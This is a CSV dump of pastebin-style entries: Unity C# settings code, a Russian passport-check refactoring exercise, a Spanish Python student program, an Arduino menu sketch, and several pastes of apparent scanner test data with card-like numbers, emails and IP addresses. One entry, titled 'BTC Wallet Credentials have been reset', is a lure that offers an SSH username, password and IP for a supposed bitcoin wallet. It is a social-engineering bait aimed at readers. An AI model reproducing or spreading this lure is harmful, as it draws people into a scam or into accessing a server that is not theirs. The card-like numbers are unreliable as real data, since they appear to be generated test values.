id,title,username,language,date,content
vQ4Xc8pC,Dich,MaoChessy,C#,Tuesday 4th of July 2023 12:58:09 PM CDT,"using System;
using Code.Csharp.Systems.CharacterSystems.Ext.SaveData;
using Code.Csharp.Systems.SaverSystem;
using Code.Csharp.Systems.SaverSystem.ProviderData;
using Code.Csharp.Systems.Scenes.App;
using Code.Csharp.Systems.UI.SettingScreen;
using Plugins.MaoUtility.Systems.DILocator.Atr;
using Plugins.MaoUtility.Systems.IoUi.Btns;
using Plugins.MaoUtility.Systems.IoUi.Core;
using UnityEngine;

namespace Code.Csharp.Systems.CharacterSystems.Ext.IO
{
    public class CharacterControlSettingKeyboardIoGroupHandler : IoGroupHandler, IUIPanelSetting
    {
        public IoBtnKey Forward;
        public IoBtnKey Back;
        public IoBtnKey Right;
        public IoBtnKey Left;
        public IoBtnKey Jump;
        public IoBtnKey DashAndRun;
        public IoBtnKey Crouch;
        public IoBtnKey Interact;
        
        
        public void SetActivated(bool isActivated)
        {
            if(isActivated) Register<CharacterControlSettingKeyboardIoGroupHandler>();    
            else Unregister<CharacterControlSettingKeyboardIoGroupHandler>();
        }
    }

    [DiMark]
    public class CharacterControlSettingKeyboardIoIniter : IoIniter<CharacterControlSettingKeyboardIoGroupHandler>
    {
        [DiInject] private AppEntity _appEntity;
        private CharacterControlMoveSettingKeyboard _data;

        [DiInject]
        private void Init() 
            => _data = _appEntity.Get<SaveEntity>().Get<ProviderSaveData>().GetData<CharacterControlMoveSettingKeyboard>();

        public override void Register(CharacterControlSettingKeyboardIoGroupHandler panel)
        {
            base.Register(panel);
            panel.Back.Init(()=>_data.KeyBack.Value, x=>_data.KeyBack.Value = x);
            panel.Forward.Init(()=>_data.KeyForward.Value, x=>_data.KeyForward.Value = x);
            panel.Right.Init(()=>_data.KeyRight.Value, x=>_data.KeyRight.Value = x);
            panel.Left.Init(()=>_data.KeyLeft.Value, x=>_data.KeyLeft.Value = x);
            panel.Jump.Init(()=>_data.KeyJump.Value, x=>_data.KeyJump.Value = x);
            panel.Crouch.Init(()=>_data.KeyCrouch.Value, x=>_data.KeyCrouch.Value = x);
            panel.DashAndRun.Init(()=>_data.KeyRunAndDash.Value, x=>_data.KeyRunAndDash.Value = x);
            panel.Interact.Init(()=>_data.KeyInteract.Value, x=>_data.KeyInteract.Value = x);
        }

        public override void Unregister(CharacterControlSettingKeyboardIoGroupHandler panel)
        {
            base.Unregister(panel);
            panel.Back.Init(()=>default, x=>{});
            panel.Forward.Init(()=>default, x=>{});
            panel.Right.Init(()=>default, x=>{});
            panel.Left.Init(()=>default, x=>{});
            panel.Jump.Init(()=>default, x=>{});
            panel.Crouch.Init(()=>default, x=>{});
            panel.DashAndRun.Init(()=>default, x=>{});
            panel.Interact.Init(()=>default, x=>{});
        }
    }

    public class ConnectorCharacterControlSettingKeyboardIoGroupHandlerHandlerAndIniter : ConnectorTypeForIoManager
    {
        public override Type TargetTypeHandler => typeof(CharacterControlSettingKeyboardIoGroupHandler);
        public override Type GetTypeIniter() => typeof(CharacterControlSettingKeyboardIoIniter);
    }
    
    [DiMark]
    public class CharacterControllSettingKeyboardSettingPanel : SettingPanel<CharacterControlMoveSettingKeyboard>
    {
        [DiInject] private AppEntity _appEntity;
        private CharacterControlMoveSettingKeyboard _data;

        [DiInject]
        private void Init() 
            => _data = _appEntity.Get<SaveEntity>().Get<ProviderSaveData>().GetData<CharacterControlMoveSettingKeyboard>();

        protected override CharacterControlMoveSettingKeyboard GetData() => _data;
    }
}"
HzDXmGZN,NapilnikRefactoring,anton_zhigalov1,C#,Tuesday 4th of July 2023 12:52:23 PM CDT," private void CheckButtonClick(object sender, EventArgs args)
        {
            const string emptyString = "" "";

            if (_passportTextbox.Text.Trim() == emptyString)
            {
                int num = (int)MessageBox.Show(""Введите серию и номер паспорта"");
            }
            else
            {
                string rawData = _passportTextbox.Text.Trim().Replace(emptyString, string.Empty);
                VerificationCompliance(rawData);
            }
        }

        private void VerificationCompliance(string rawData)
        {
            int maxCountLength = 10;

            if (rawData.Length < maxCountLength)
            {
                _textResult.Text = ""Неверный формат серии или номера паспорта"";
            }
            else
            {
                string commandText = string.Format($""select * from passports where"" +
                      $"" num='0' limit 1;, {(object)Form.ComputeSha256Hash(rawData)}"");
                string connectionString = string.Format($""Data Source= "" +
                    $""{Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)} \\db.sqlite"");
                TryConnection(commandText, connectionString);
            }
        }

        private void TryConnection(string commandText, string connectionString)
        {
            SQLiteConnection connection = new SQLiteConnection(connectionString);
            SQLiteDataAdapter sqLiteDataAdapter = new SQLiteDataAdapter(new SQLiteCommand(commandText, connection));
            DataTable dataTable = new DataTable();
            connection.Open();

            try
            {
                sqLiteDataAdapter.Fill(dataTable);
                FindByDate(dataTable);
                connection.Close();

            }
            catch (SQLiteException liteException)
            {
                int errorCode = 1;

                if (liteException.ErrorCode != errorCode)
                    return;
                int num = (int)MessageBox.Show(""Файл db.sqlite не найден."" +
                                     "" Положите файл в папку вместе с exe."");
            }
        }

        private void FindByDate(DataTable dataTable)
        {
            if (dataTable.Rows.Count > 0)
                GetTextResult(dataTable);
            else
                _textResult.Text = $""Паспорт «{_passportTextbox.Text}»"" +
                $"" в списке участников дистанционного голосования НЕ НАЙДЕН"";
        }

        private TextResult GetTextResult(DataTable dataTable)
        {
            const string accessWasGranted = ""ПРЕДОСТАВЛЯЛСЯ"";
            const string accessWasNotGranted = ""НЕ ПРЕДОСТАВЛЯЛСЯ"";

            if (Convert.ToBoolean(dataTable.Rows[0].ItemArray[1]) == false)
                return _textResult.Text = ShowTextResult(accessWasNotGranted);

            return _textResult.Text = ShowTextResult(accessWasGranted);
        }

        private string ShowTextResult(string text)
        {
            return $""По паспорту «{_passportTextbox.Text}» доступ к бюллетеню"" +
                   $"" на дистанционном электронном голосовании {text}"";
        }"
ynRUpXf9,BTC Wallet Credentials have been reset,posserestu_37,GetText,Tuesday 4th of July 2023 12:43:52 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are preciousannehn:H7QHSp on 45.9.148.244
You can connect via SSH.
Regards"
aEetpLAf,integrador v1 sin funciones,teslariu,Python,Tuesday 4th of July 2023 12:25:49 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Una universidad desea crear un programa para contabilizar los cursos que
tiene cada alumno. Para ello se debe realizar primero una aplicación
de consola la cual debe solicitar el nombre de un alumno y la cantidad 
de cursos en la que se encuentra inscripto. Estos dos valores deben 
almacenarse como una lista de dos elementos (el nombre y la cantidad
de cursos como un número entero) en una lista de alumnos.

Una vez hecho esto, se debe hacer que el programa, al iniciar, pregunte 
cuál de las siguientes dos operaciones se debe realizar: ingresar un
alumno o ver la lista de alumnos ingresados. 
""""""
# defino la estructura de datos (como voy a guardar los datos)
# alumnos = [ [""Juan"", 3], [""Ana"",5], [""Josefa"",6] ]
alumnos = []

# defino el menu del programa
menu = """"""
Ingrese el número de la operación que desea ejecutar:
1 - Ingresar un alumno.
2 - Ver la lista de los alumnos ingresados.
3 - Salir.
""""""

# el programa se debe ejecutar hasta que el usuario ingrese opcion 4
while True:
    print(menu)
    opcion = input("">>> "")
    
    if opcion == ""1"":
        nombre = input(""Ingrese su nombre: "")
        cursos = int(input(""Ingrese los cursos: ""))
        alumnos.append([nombre, cursos])
        print(""¡El alumno fue añadido a la lista!"")
        
    elif opcion == ""2"":
        """"""
        Pablo - 3 cursos
        """"""
        print(""Lista de alumnos:"")
        for alumno in alumnos:
            print(f""{alumno[0]} - {alumno[1]} cursos"")
                
        
            
    elif opcion == ""3"":
        print(""Gracias por utilizar este programa"")
        break
            
    else:
        print(""La opción ingresada no es correcta, vuelva a intentarlo."")
"
v2dMFAqM,jeu multimodes,williamcaillaud,C++,Tuesday 4th of July 2023 12:00:53 PM CDT,"

/**********************************************************************************
 * *******                          LIBRAIRIES                            ******* * 
 **********************************************************************************/


#include <SPI.h>                // appelle la librairie pour la liaison echange de données
#include <Wire.h>               // appelle la librairie pour la liaison echange de données I2C
#include <Adafruit_GFX.h>       
#include <Adafruit_SH110X.h>    // pour faire fonctionner l'écran OLED 

#define i2c_Adress 0x3c         // defini l'adresse I2C de l'ecran, ici 0x3C
#define SCREEN_WIDTH 128        // defini que l'écran fait 128 pixel de large
#define SCREEN_HEIGHT 64        // defini que l'écran fait 64 pixel de haut
#define OLED_RESET -1   //   QT-PY / XIAO
Adafruit_SH1106G display = Adafruit_SH1106G(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
/* ********************************************************************************
 * ***************                  CONSTANTES                     ****************
 ******************************************************************************** */ 
const int downPin = 2;     // the number of the pushbutton 1 pin
const int upPin = 3;     // the number of the pushbutton 2 pin
const int enterPin = 4;     // the number of the pushbutton 3 pin
const int backPin = 5;     // the number of the pushbutton 4 pin
const int startPin = 8;     // the number of the pushbutton Start Button pin
const int ledPin1B =  14;     // the number of the LED pin

/* ********************************************************************************
 * ***************                  VARIABLES                      ****************
 ******************************************************************************** */


int selected = 0;             // selection du menu de jeu
int entered = 0;             // validation du menu de jeu
int selectedsnip = 0;           // selection type de jeu sniper 
int entered1 = 0;          // validation du type de jeu snipe
int validMenu = 0;
int selected1 =0 ;


/* ********************************************************************************
 * ***************                    SETUP                        ****************
 ******************************************************************************** */


void setup() {

  Serial.begin(9600);                    // initialise la liaison serie à 9600 BAUD
  display.begin(i2c_Adress, true);       // initialise la liaison avec l'écran
  
  // initialize the LED pin as an output:
  pinMode(ledPin1B, OUTPUT);

  // initialize the pushbutton pin as an input:
  pinMode(downPin, INPUT);
  pinMode(upPin, INPUT);
  pinMode(enterPin, INPUT);
  pinMode(backPin, INPUT);
  pinMode(startPin, INPUT);

 display.clearDisplay();                // efface l'écran
  validMenu = 1; 
}
 
void loop() {

  displaymenu(); 

}


void displaymenu() {
  if (validMenu == 1){
    int down = digitalRead(downPin);
    int up = digitalRead(upPin);
    int enter = digitalRead(enterPin);
    int back = digitalRead(backPin);
    int start = digitalRead(startPin);
 

  display.drawRoundRect(2,2,126,62,10,SH110X_WHITE);
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(10, 15);
  display.print(""zone1"");
  display.display();
 
  display.setCursor(10, 30);
  display.print(""zone2"");
  display.display();

  display.setCursor(10, 45);
  display.print(""CONFIGURATION"");
  display.display();
   
    if (up == LOW){
      selected = selected +1;
      delay(200);
      if(selected >= 3){
        selected = 0;
      }
    }
    if (down == LOW){
      selected = selected -1;
      delay(200);
      if (selected <= -1){
        selected = 2;
      }
    }
    switch(selected){
      case 0:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_WHITE);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_BLACK);
        display.display();
        if (enter == LOW){
          display.clearDisplay();
          validMenu = 2;
          menu1();  
        }
        break;

      case 1:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_WHITE);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_BLACK);
        display.display();
        break;
        
      case 2:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_WHITE);
        display.display();
        break;

    } 
  }
}




void menu1() {
  if (validMenu == 2){
    int down1 = digitalRead(downPin);
    int up1 = digitalRead(upPin);
    int enter1 = digitalRead(enterPin);
    int back1 = digitalRead(backPin);
    int start1 = digitalRead(startPin);
 

  display.drawRoundRect(2,2,126,62,10,SH110X_WHITE);
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(10, 15);
  display.print(""Jeu 1"");
  display.display();
 
  display.setCursor(10, 30);
  display.print(""Jeu 2"");
  display.display();

  display.setCursor(10, 45);
  display.print(""RETOUR"");
  display.display();
   
    if (up1 == LOW){
      selected1 = selected1 +1;
      delay(200);
      if(selected1 >= 3){
        selected1 = 0;
      }
    }
    if (down1 == LOW){
      selected1 = selected1 -1;
      delay(200);
      if (selected1 <= -1){
        selected1 = 2;
      }
    }
    switch(selected1){
      case 0:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_WHITE);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_BLACK);
        display.display();
        if (enter1 == LOW){
          display.clearDisplay();
          validMenu = 3;
          jeu1();  
        }
        break;

      case 1:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_WHITE);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_BLACK);
        display.display();
        break;
        
      case 2:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_WHITE);
        display.display();
        break;

    } 
  }
}
  


"
uTVnJVp7,Untitled,backparsnip,Bash,Tuesday 4th of July 2023 11:38:40 AM CDT,"tamsin.kilduff@greencastle.org.uk
 
BM Testing
This is July 4 '23 testing 1738
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6e"
BX4Py40r,Untitled,wheresTheAnyKey,Bash,Tuesday 4th of July 2023 11:38:21 AM CDT,"

Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, gradually-close@castlelandscape.co.uk also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
mU2ZS0yu,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:18 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
8xPiQHVR,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:16 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
BTdmtFi8,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:15 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
